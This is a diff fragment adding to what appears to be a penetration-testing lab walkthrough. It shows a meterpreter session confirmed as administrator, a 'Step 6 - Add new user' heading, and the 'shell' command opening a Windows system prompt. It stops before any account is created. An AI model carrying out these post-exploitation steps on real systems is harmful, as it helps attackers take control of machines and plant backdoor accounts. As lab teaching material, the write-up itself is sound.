@@ -433,6 +433,29 @@ meterpreter > getuid
 Server username: READTEAMBD\administrator
 ```
 
+The session was now running with Administrator privileges.
+
+## Step 6 - Add new user
+
+```bash
+shell
+```
+
+**Output:**
+
+```text
+meterpreter > shell
+Process 2236 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.19045.2965]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+
+
+
 
 
 
